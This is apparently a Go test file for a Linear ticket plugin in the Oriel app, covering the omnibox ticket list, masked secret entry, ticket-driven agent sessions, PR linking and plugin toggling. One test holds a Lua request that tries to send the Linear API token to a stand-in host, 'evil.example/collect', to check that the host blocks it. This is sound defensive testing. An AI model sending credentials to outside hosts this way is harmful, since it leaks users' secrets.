package app_test

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/liamg/oriel/app/apptest"
	"github.com/liamg/oriel/app/apptest/rig"
	"github.com/liamg/oriel/app/kit"
	appsessions "github.com/liamg/oriel/app/sessions"
	"github.com/liamg/oriel/app/settings"

	"github.com/liamg/oriel/core"
	"github.com/liamg/oriel/gh"
	"github.com/liamg/oriel/integ/linear"
	"github.com/liamg/oriel/integ/linear/lineartest"
	"github.com/liamg/oriel/plugin"
	"github.com/liamg/oriel/plugin/hosttest"
	"github.com/liamg/oriel/registry"
	"github.com/liamg/oriel/render"
	"github.com/liamg/oriel/script"
)

// linearPlugin is the Linear plugin (integ/linear/plugin) as an install lays it out: its files, and its process
// built into bin/, granted what its manifest declares.
func linearPlugin(t *testing.T) plugin.Caller {
	t.Helper()
	dir := hosttest.Install(t, "../integ/linear/plugin", "../integ/linear/cmd/oriel-linear")
	m, err := plugin.LoadManifest(dir)
	if err != nil {
		t.Fatal(err)
	}
	g := plugin.NewGrants()
	g.Grant(m.ID, m.Permissions)
	return plugin.Caller{ID: m.ID, Dir: dir, Guard: g}
}

// linearConfig is the app reaching the recorded Linear for the internet, with secrets kept in a file of the test's.
func linearConfig(t *testing.T, l *lineartest.Linear) (func(*apptest.Config), *plugin.SecretFile) {
	secrets := &plugin.SecretFile{Path: filepath.Join(t.TempDir(), "secrets.json")}
	return func(cfg *apptest.Config) { cfg.Net, cfg.Secrets = l.Client(), secrets }, secrets
}

// loadLinear runs the plugin's init.lua in a VM of its own, as an installed plugin's, after its [contributes].
func loadLinear(t *testing.T, s *apptest.Scene) *script.VM {
	t.Helper()
	p := linearPlugin(t)
	m, err := plugin.LoadManifest(p.Dir)
	if err != nil {
		t.Fatal(err)
	}
	d, err := plugin.Contribute(s.Registry(), p.Dir, m.ID, m.Contributes)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(d.Dispose)
	vm := s.PluginVM(p)
	src, err := os.ReadFile(filepath.Join(p.Dir, "init.lua"))
	if err != nil {
		t.Fatal(err)
	}
	if err := vm.Load(script.Chunk{Name: "init.lua", Source: src}); err != nil {
		t.Fatal(err)
	}
	s.Frame()
	return vm
}

// Linear's assigned tickets, here the omnibox's `!` tickets, from a recorded Linear API. Before there's a key the
// list asks for one; the key is pasted into Oriel's secrets dialog, shown as dots, and only Oriel sends it, to
// api.linear.app alone.
func TestLinearTicketsInTheOmnibox(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	s := apptest.New(t, apptest.Options{Config: change})
	loadLinear(t, s)

	s.Run("omnibox.open", registry.Args{"query": "!"})
	s.Until("the ask for a key", func() bool { return strings.Contains(s.Text(), "Set your Linear API key") })
	s.Type("CR")
	s.Until("the secrets dialog", func() bool { return strings.Contains(s.Text(), "Set LINEAR_TOKEN") })
	for _, r := range lineartest.Key {
		s.Type(string(r))
	}
	if strings.Contains(s.FullText(), lineartest.Key) || !strings.Contains(s.Text(), strings.Repeat("•", len(lineartest.Key))) {
		t.Errorf("the key shows as typed:\n%s", s.Text())
	}
	s.Type("CR")
	if v, ok := secrets.Secret("LINEAR_TOKEN"); v != lineartest.Key || !ok {
		t.Fatalf("the secret kept: %q, %v", v, ok)
	}

	s.Run("omnibox.open", registry.Args{"query": "!"})
	s.Until("the tickets", func() bool { return strings.Contains(s.Text(), "ENG-2252") })
	text := strings.ReplaceAll(s.Text(), "\n", "")
	order := []string{"ENG-2231 Search API returns stale results after a reindex", "ENG-2240 Prime the result cache after a reindex",
		"ENG-2219 Round minor units half-even, per currency", "ENG-2252 Bundle price lookup times out"}
	at := -1
	for _, want := range order {
		i := strings.Index(text, want)
		if i < at {
			t.Errorf("%q isn't in crit's order:\n%s", want, text)
		}
		at = i
	}
	for _, want := range []string{"TICKETS", "TODO", "IN PROGRESS", "BACKLOG", "PR #4398 · high", "blocked · high", "PR #530 · medium",
		"↵ starts work on it: a plan, the ticket its context"} {
		if !strings.Contains(text, want) {
			t.Errorf("the tickets lack %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "ENG-2260") {
		t.Error("the duplicate is listed")
	}
	for _, a := range l.Auths() {
		if a != "api.linear.app "+lineartest.Key {
			t.Errorf("a request went as %q", a)
		}
	}
}

// Start work from a ticket: the ticket picked in the omnibox opens the launcher on Plan with its card, and starting
// it gives the agent the ticket with its comments and attachments, and moves the ticket into progress in Linear.
func TestLinearStartWorkFromATicket(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	lw := rig.NewHost(t)
	s := apptest.New(t, apptest.Options{Config: func(cfg *apptest.Config) { apptest.Connect(lw.W)(cfg); change(cfg) }})
	// Under the scene's HOME, the repo's path reads the same on every machine.
	if _, err := lw.W.AddRepoPath(context.Background(), rig.HomeClone(t, lw.Repo, "pricing")); err != nil {
		t.Fatal(err)
	}
	s.Now = apptest.At(14, 30, 0)
	rig.WaitState(t, s.Store(), "the machine", func(st core.State) bool { return !st.Machine.Sampled.IsZero() })
	loadLinear(t, s)
	// The test host has no sandbox factory.
	if err := s.Registry().Options().Set("sandbox.default", registry.LayerUser, registry.At{}, "host"); err != nil {
		t.Fatal(err)
	}

	s.Run("omnibox.open", registry.Args{"query": "!ENG-2231"})
	s.Until("the ticket", func() bool {
		return strings.Contains(s.Text(), "Search API returns stale results after a reindex")
	})
	s.Type("CR")
	s.Until("the card", func() bool { return strings.Contains(s.Text(), "linked PR #4398") })
	text := s.Text()
	for _, want := range []string{"NEW SESSION", "from ticket", "ENG-2231", "TODO", "Search API returns stale results after a reindex",
		"Customers who rebuild their index", "2 attachments", "4 comments", "the ticket, comments and attachments go to the agent as context",
		"Start Plan"} {
		if !strings.Contains(text, want) {
			t.Errorf("the launcher lacks %q:\n%s", want, text)
		}
	}
	s.ClickText("pricing")
	typeKeysIn(s, t, "Confirm the cache is keyed by org first.", appsessions.PromptPlaceholder)
	s.Lint("the launcher with a ticket")
	s.Golden("launcher-ticket")

	s.Run("session.launch", nil)
	s.Until("the session", func() bool { return !strings.Contains(s.Text(), "NEW SESSION") })
	sent := lw.Fake.WaitStarted(t).WaitSent(t)
	for _, want := range []string{"Confirm the cache is keyed by org first.", "Linear ticket ENG-2231: Search API returns stale results after a reindex",
		"## Comments (4)", "> Please keep the response shape: the CLI pins it.", "search-stale-results.har (412 KB)",
		"https://github.com/acme/cloud/pull/4398"} {
		if !strings.Contains(sent.Text, want) {
			t.Errorf("the agent wasn't given %q:\n%s", want, sent.Text)
		}
	}
	s.Until("the ticket in progress", func() bool {
		for _, m := range l.Mutations() {
			in, _ := m.Vars["input"].(map[string]any)
			if m.Op == "issueUpdate" && m.Vars["id"] == "a3f9e2c1-0d44-4b7e-8f61-2c5d9b7e2231" && in["stateId"] == "6c1b3a8e-2d6f-4f0a-9a51-0b3f6f0f1a03" {
				return true
			}
		}
		return false
	})
	s.Until("the notice", func() bool { return strings.Contains(s.FullText(), "ENG-2231 moved to In Progress in Linear") })
	for _, se := range s.Store().State().Sessions {
		if se.Kind == core.KindPlan && se.Ticket != "ENG-2231" {
			t.Errorf("the session's ticket is %q", se.Ticket)
		}
	}
}

// typeKeysIn clicks the field showing placeholder and types text into it.
func typeKeysIn(s *apptest.Scene, t *testing.T, text, placeholder string) {
	t.Helper()
	s.ClickText(placeholder)
	for _, r := range text {
		k := string(r)
		s.Type(k)
	}
}

// A ticket moves to in review on a PR and links back to it, whoever raised it: a PR on the session's branch, read by
// the Ship page, is attached to the session's ticket and moves it into review.
func TestLinearPRLinkedBack(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s, _, hub, se, _ := apptest.ShipScene(t, change)
	loadLinear(t, s)
	pr := hub.AddPR("acme/search-api", gh.PR{Title: "feat: rate-limit headers", Head: se.Branch, Base: "main"})
	s.Run("ship.refresh", nil)
	// The session's own start may move it into progress first; it ends in review either way.
	inReview := func() bool {
		m := l.Mutations()
		for i := len(m) - 1; i >= 0; i-- {
			if m[i].Op == "issueUpdate" {
				in, _ := m[i].Vars["input"].(map[string]any)
				return in["stateId"] == "6c1b3a8e-2d6f-4f0a-9a51-0b3f6f0f1a04"
			}
		}
		return false
	}
	s.ShipSettle("the PR linked and the ticket in review", inReview)
	var links []map[string]any
	for _, m := range l.Mutations() {
		if m.Op == "attachmentCreate" {
			in, _ := m.Vars["input"].(map[string]any)
			links = append(links, in)
		}
	}
	if len(links) != 1 || links[0]["url"] != pr.URL || links[0]["issueId"] != "a3f9e2c1-0d44-4b7e-8f61-2c5d9b7e2231" ||
		links[0]["title"] != "#"+itoa(pr.Number)+" feat: rate-limit headers" {
		t.Errorf("the links: %+v", links)
	}
	s.Until("the notice", func() bool { return strings.Contains(s.FullText(), "ENG-2231 moved to In Review in Linear") })

	// Read again, the PR is old news: nothing more is sent.
	sent := len(l.Mutations())
	s.Run("ship.refresh", nil)
	s.ShipSettle("a second read", func() bool { return true })
	time.Sleep(100 * time.Millisecond)
	s.RunQueued()
	if n := len(l.Mutations()); n != sent {
		t.Errorf("%d changes after a second read, %d before", n, sent)
	}
}

// The plugin calls oriel.http.get(url, { auth = "LINEAR_TOKEN" }); the host injects the header, and only if the
// request goes to api.linear.app. From the plugin's Lua: the answer comes back, the key never does, and the key
// can't be sent anywhere else.
func TestLuaHTTPWithASecret(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s := apptest.New(t, apptest.Options{Config: change})
	m, err := plugin.LoadManifest(filepath.Join("..", "integ", "linear", "plugin"))
	if err != nil {
		t.Fatal(err)
	}
	g := plugin.NewGrants()
	g.Grant(m.ID, m.Permissions)
	vm := s.PluginVM(plugin.Caller{ID: m.ID, Dir: t.TempDir(), Guard: g})
	s.Frame()
	if err := luaErr(t, vm, `
oriel.http.request({ url = "https://api.linear.app/graphql", method = "POST", body = '{"query":"{ viewer { assignedIssues { nodes { id } } } }"}',
  headers = { ["Content-Type"] = "application/json" }, auth = "LINEAR_TOKEN", auth_scheme = "none" }, function(res, err) got, failed = res, err end)
oriel.http.request({ url = "https://evil.example/collect", auth = "LINEAR_TOKEN" }, function(res, err) evil = err end)
oriel.http.request({ url = "https://evil.example/collect" }, function(res, err) plain = err end)`); err != "" {
		t.Fatal(err)
	}
	s.Until("the answers", func() bool {
		return global(vm, "got") != nil && global(vm, "evil") != nil && global(vm, "plain") != nil
	})
	if st := global(vm, "got.status"); st != 200.0 {
		t.Errorf("status %v, failed %v", st, global(vm, "failed"))
	}
	if body, _ := global(vm, "got.body").(string); !strings.Contains(body, "assignedIssues") || strings.Contains(body, lineartest.Key) {
		t.Errorf("body %q", body)
	}
	if e, _ := global(vm, "evil").(string); !strings.Contains(e, `isn't declared for evil.example`) {
		t.Errorf("the key to another host: %q", e)
	}
	if e, _ := global(vm, "plain").(string); !strings.Contains(e, `"net" capability isn't declared for evil.example`) {
		t.Errorf("another host at all: %q", e)
	}
	for _, a := range l.Auths() {
		if !strings.HasPrefix(a, "api.linear.app ") {
			t.Errorf("a request reached %q", a)
		}
	}
}

// "my_tickets" is Linear's, the tickets assigned to you, offered to the assistant alone.
func TestLinearTicketsForTheAssistant(t *testing.T) {
	l := lineartest.New(t)
	change, secrets := linearConfig(t, l)
	s := apptest.New(t, apptest.Options{Config: change})
	if err := secrets.SetSecret("LINEAR_TOKEN", lineartest.Key); err != nil {
		t.Fatal(err)
	}
	loadLinear(t, s)
	tools := registry.AgentToolsFor(s.Registry(), kit.AssistantAgent, true)
	i := slices.IndexFunc(tools, func(t registry.AgentTool) bool { return t.Name == "my_tickets" })
	if i < 0 || !tools[i].ReadOnly || tools[i].Reads != "tickets" {
		t.Fatalf("the assistant's tools: %+v", tools)
	}
	if slices.ContainsFunc(registry.AgentToolsFor(s.Registry(), "work", false), func(t registry.AgentTool) bool { return t.Name == "my_tickets" }) {
		t.Error("a work session's agent was offered my_tickets")
	}
	ctx := registry.WithAgent(context.Background(), kit.AssistantAgent)
	var out string
	s.Until("the tickets", func() bool {
		o, err := s.CallTool(ctx, apptest.Timeout, tools[i], nil)
		if err != nil {
			t.Fatal(err)
		}
		out = o
		return strings.Contains(out, "ENG-2231")
	})
	for _, want := range []string{"Search API returns stale results after a reindex", "ENG-2252", "https://linear.app/"} {
		if !strings.Contains(out, want) {
			t.Errorf("my_tickets lacks %q: %s", want, out)
		}
	}
}

// bundledLinear is the app on workDir (the start view if "") with the Linear plugin bundled as oriel ships it
// (linear.Plugin), its process built for the test as Self in place of oriel's own `plugin-process linear`.
func bundledLinear(t *testing.T, l *lineartest.Linear, workDir string) (*apptest.Scene, *plugin.SecretFile) {
	t.Helper()
	dir := hosttest.Install(t, "../integ/linear/plugin", "../integ/linear/cmd/oriel-linear")
	change, secrets := linearConfig(t, l)
	s := apptest.New(t, apptest.Options{WorkDir: workDir, Config: func(cfg *apptest.Config) {
		change(cfg)
		cfg.Bundled = []plugin.Bundled{linear.Plugin}
		cfg.Self = []string{filepath.Join(dir, "bin", "oriel-linear")}
	}})
	s.Frame()
	return s, secrets
}

// PLAN (tickets page) → Dormant until keyed: the bundled Linear plugin shows no rail or home entry until its key is
// set in Settings › Secrets, where the field shows dots and then "set", never the value. Cleared, they go again.
func TestLinearDormantUntilKeyed(t *testing.T) {
	l := lineartest.New(t)
	s, secrets := bundledLinear(t, l, "")
	if st := apptest.PluginOf[*settings.Catalog](s, "catalog").State("liamg/linear"); st != "loaded" {
		t.Fatalf("the bundled plugin is %q", st)
	}
	if n := s.Count("Linear tickets"); n != 0 {
		t.Fatalf("%d Linear entries before the key", n)
	}

	s.Run("Settings", registry.Args{"args": "secrets"})
	s.Frame()
	if n := s.Count("Linear tickets"); n != 0 {
		t.Fatalf("%d Linear entries in the rail before the key", n)
	}
	for _, want := range []string{"LINEAR_TOKEN", "liamg/linear", "Your Linear API key, sent only to api.linear.app", "sent only to api.linear.app"} {
		if !strings.Contains(s.Text(), want) {
			t.Errorf("Settings › Secrets lacks %q:\n%s", want, s.Text())
		}
	}
	typeKeysIn(s, t, lineartest.Key, "paste it here")
	if strings.Contains(s.FullText(), lineartest.Key) || !strings.Contains(s.Text(), strings.Repeat("•", len(lineartest.Key))) {
		t.Errorf("the key shows as typed:\n%s", s.Text())
	}
	s.ClickNode("Save")
	if v, ok := secrets.Secret("LINEAR_TOKEN"); v != lineartest.Key || !ok {
		t.Fatalf("the secret kept: %q, %v", v, ok)
	}
	text := s.Text()
	if strings.Contains(s.FullText(), lineartest.Key) || !strings.Contains(text, "SET") || !strings.Contains(text, "••••••••") {
		t.Errorf("the set secret:\n%s", text)
	}
	s.Lint("Settings › Secrets")
	s.Type("Esc")
	s.Frame()
	if s.StartCard("Linear tickets") == nil {
		t.Errorf("no Linear entry on the start view once keyed:\n%s", s.Text())
	}
	// The rail is a workspace's: a session running brings it, with the entry.
	s.Store().Apply(core.SessionSynced{Session: core.SessionState{ID: "w", Name: "w", Kind: core.KindWork}})
	s.Store().Apply(core.SessionFocused{ID: "w"})
	s.Frame()
	railEntry(s, t, "Linear tickets")

	s.Run("Settings", registry.Args{"args": "secrets"})
	s.Frame()
	s.ClickNode("Clear")
	if _, ok := secrets.Secret("LINEAR_TOKEN"); !ok {
		t.Fatal("Clear cleared it without asking")
	}
	s.ClickNode("Sure?")
	if _, ok := secrets.Secret("LINEAR_TOKEN"); ok {
		t.Fatal("the secret outlived Clear")
	}
	if n := s.Count("Linear tickets"); n != 0 {
		t.Errorf("%d Linear entries in the rail once cleared", n)
	}
	s.Type("Esc")
	s.Frame()
	if n := s.Count("Linear tickets"); n != 0 {
		t.Errorf("%d Linear entries once cleared", n)
	}
}

// PLAN (tickets page): the rail's Linear entry opens the page on Linear's tickets, in crit's order with their state,
// priority, project, PR and blocked; selecting one asks Linear for the rest of it.
func TestLinearTicketsPage(t *testing.T) {
	l := lineartest.New(t)
	s, secrets := bundledLinear(t, l, t.TempDir())
	secrets.SetSecret("LINEAR_TOKEN", lineartest.Key)
	s.Frame()
	s.Click(apptest.Centre(railEntry(s, t, "Linear tickets").Bounds), 0)
	s.Until("the tickets", func() bool { return strings.Contains(s.Text(), "ENG-2252") })
	text := strings.ReplaceAll(s.Text(), "\n", " ")
	order := []string{"ENG-2231", "ENG-2240", "ENG-2219", "ENG-2252"}
	at := -1
	for _, want := range order {
		i := strings.Index(text, want)
		if i < at {
			t.Errorf("%q isn't in crit's order:\n%s", want, text)
		}
		at = i
	}
	for _, want := range []string{"LINEAR TICKETS", "4 assigned", "TODO", "IN PROGRESS", "BACKLOG", "high · Usage · PR #4398", "Pricing API", "blocked",
		"Search API returns stale results after a reindex"} {
		if !strings.Contains(text, want) {
			t.Errorf("the page lacks %q:\n%s", want, text)
		}
	}
	if strings.Contains(text, "ENG-2260") {
		t.Error("the duplicate is listed")
	}
	s.ClickText("Prime the result cache after a reindex")
	s.Until("the ticket's detail", func() bool {
		return strings.Contains(s.Text(), "Evict the org's cached results when its index is rebuilt")
	})
	// The whole description, as markdown: past its first paragraph, a list's bold drawn without its stars.
	if text := s.Text(); !strings.Contains(text, "Then warm the cache:") || !strings.Contains(text, "top queries") || strings.Contains(text, "**") {
		t.Errorf("the detail doesn't show the whole description as markdown:\n%s", text)
	}
	s.Lint("the tickets page")
	s.Golden("tickets-page")
}

// railEntry is the rail's entry labelled label: the narrow sidebar's icon.
func railEntry(s *apptest.Scene, t *testing.T, label string) *render.AccessNode {
	t.Helper()
	var found *render.AccessNode
	var find func(n *render.AccessNode)
	find = func(n *render.AccessNode) {
		if n.Name == label && found == nil && n.Bounds.Max.X > 0 && n.Bounds.Min.X < 80 {
			found = n
		}
		for _, k := range n.Children {
			find(k)
		}
	}
	find(s.UI().AccessTree())
	if found == nil {
		t.Fatalf("no rail entry %q:\n%s", label, s.Text())
	}
	return found
}

// The Plugins page lists the bundled Linear as BUNDLED; Disable turns it off (its
// tracker goes) and Enable back on; installing the same id from [plugins] replaces it while it's listed.
func TestBundledPluginOffAndReplaced(t *testing.T) {
	l := lineartest.New(t)
	s, _ := bundledLinear(t, l, "")
	x := apptest.PluginOf[*settings.Catalog](s, "catalog")
	state := func() string { return x.State("liamg/linear") }
	tracker := func() bool { _, ok := registry.TrackerFor(s.Registry(), "ENG-1"); return ok }
	if !tracker() {
		t.Fatal("the bundled tracker isn't registered")
	}
	s.Run("plugins.open", nil)
	s.Frame()
	s.TypeInto("Filter plugins", "linear")
	s.Frame()
	if text := s.Text(); !strings.Contains(text, "BUNDLED") || !strings.Contains(text, "liamg/linear · loaded") {
		t.Errorf("the Plugins page:\n%s", text)
	}
	s.ClickText("liamg/linear · loaded")
	s.ClickNode("Disable")
	s.Until("it off", func() bool { return state() == "disabled" })
	if tracker() {
		t.Error("the tracker outlived Disable")
	}
	s.ClickNode("Enable")
	s.Until("it on", func() bool { return state() == "loaded" })
	if !tracker() {
		t.Error("Enable didn't bring the tracker back")
	}

	s.Run("plugins.install", registry.Args{"id": "liamg/linear", "path": filepath.Join("..", "integ", "linear", "plugin")})
	syncPlugins(s, t)
	s.Until("it replaced", func() bool { return state() == "replaced by its install" })
	s.Run("plugins.uninstall", registry.Args{"id": "liamg/linear"})
	syncPlugins(s, t)
	s.Until("it back", func() bool { return state() == "loaded" })
}
